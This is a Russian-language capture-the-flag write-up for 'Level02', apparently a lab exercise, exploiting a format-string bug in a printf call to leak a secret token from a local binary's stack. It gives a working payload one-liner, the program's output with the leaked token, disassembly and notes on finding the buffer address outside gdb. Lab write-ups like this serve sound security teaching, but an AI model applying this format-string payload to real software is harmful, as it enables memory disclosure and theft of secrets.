## Level02

В данной функции имеется незащищенный вызов `printf` с прочтенным пользовательским вводом в качестве форматной строки. Мы можем использовать его, чтобы прочитать буфер, в который ранее программа записала значение токена.

Нужно быть внимательным, так как данная программа скомпилирована для x86_64, а значит, адрес для `%s` может идти только в конце аргумента. Подробности [тут](https://tripoloski1337.github.io/ctf/2020/06/11/format-string-bug.html).

Итого,

```sh
> python -c "print  '%p'*37 + '%.500s' + '\x00\x00\x7f\xff\xff\xff\xe5\x60'[::-1] + '\n' + 'b'" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0(nil)0x620x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x62(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x733030352e257025Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`???? does not have access!
```

Мы видим содержание пяти регистров `edi, esi, edx, ecx, r8d, r9d` (согласно Linux ABI для x86_64), за которыми следуют значения, записанные в стэк. В конце вывода находится искомый токен `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

Чтобы найти адрес буфера на стэке, куда записан токен, мы воспользовались gdb. Согласно следующим инструкциям дизассемблера, мы понимаем, что буфер находится по адресу `rbp-0xa0`, что соответствует `0x00007fffffffe530` внутри дебаггера.

```
lea     rax, [rbp-0xa0 {var_a8}]
mov     rdx, qword [rbp-0x8 {var_10_1}]
mov     rcx, rdx
mov     edx, 0x29
mov     esi, 0x1
mov     rdi, rax {var_a8}
call    fread
```

Однако часто стэк, видимый изнутри gdb, сдвинут по сранению со стэком, имеющимся когда программа запускается вне дебаггера, из-за различий в переменных окружения. Мы сталкивавлись с этим на предыдущем уровне. Методом проб и ошибок мы находим, что буфер вне gdb находится по адресу `0x00007fffffffe560`.

 